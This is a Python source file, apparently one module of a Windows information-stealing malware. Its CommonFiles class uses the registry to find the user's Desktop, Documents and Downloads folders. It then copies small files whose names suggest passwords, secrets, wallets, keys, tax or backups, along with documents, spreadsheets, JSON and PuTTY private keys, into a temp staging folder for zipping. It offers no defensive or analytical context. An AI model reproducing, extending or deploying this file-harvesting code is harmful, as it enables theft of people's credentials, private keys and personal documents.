import os
import shutil
import winreg

class CommonFiles:
    def __init__(self):
        self.zipfile = os.path.join(temp_path, f'Common-Files-{os.getlogin()}.zip')
        self.steal_common_files()
        

    def steal_common_files(self) -> None:
        def _get_user_folder_path(folder_name):
            try:
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders") as key:
                    value, _ = winreg.QueryValueEx(key, folder_name)
                    return value
            except FileNotFoundError:
                return None
            
        paths = [_get_user_folder_path("Desktop"), _get_user_folder_path("Personal"), _get_user_folder_path("{374DE290-123F-4565-9164-39C4925E467B}")]
        
        for search_path in paths:
            if os.path.isdir(search_path):
                entry: str
                for entry in os.listdir(search_path):
                    if os.path.isfile(os.path.join(search_path, entry)):
                        if (any([x in entry.lower() for x in ("secret", "password", "account", "tax", "key", "wallet", "backup")]) \
                            or entry.endswith((".txt", ".rtf", ".odt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx,", ".ods", ".json", ".ppk"))) \
                            and not entry.endswith(".lnk") \
                            and 0 < os.path.getsize(os.path.join(search_path, entry)) < 2 * 1024 * 1024: # File less than 2 MB
                            try:
                                os.makedirs(os.path.join(temp_path, "Common Files"), exist_ok=True)
                                shutil.copy(os.path.join(search_path, entry), os.path.join(temp_path, "Common Files", entry))
                            except Exception:
                                pass
                    elif os.path.isdir(os.path.join(search_path, entry)) and not entry == "Common Files":
                        for sub_entry in os.listdir(os.path.join(search_path, entry)):
                            if os.path.isfile(os.path.join(search_path, entry, sub_entry)):
                                if (any([x in sub_entry.lower() for x in ("secret", "password", "account", "tax", "key", "wallet", "backup")]) \
                                    or sub_entry.endswith((".txt", ".rtf", ".odt", ".doc", ".docx", ".pdf", ".csv", ".xls", ".xlsx,", ".ods", ".json", ".ppk"))) \
                                    and not entry.endswith(".lnk") \
                                    and 0 < os.path.getsize(os.path.join(search_path, entry, sub_entry)) < 2 * 1024 * 1024: # File less than 2 MB
                                    try:
                                        os.makedirs(os.path.join(temp_path, "Common Files", entry), exist_ok=True)
                                        shutil.copy(os.path.join(search_path, entry, sub_entry), os.path.join(temp_path, "Common Files", entry))
                                    except Exception:
                                        pass
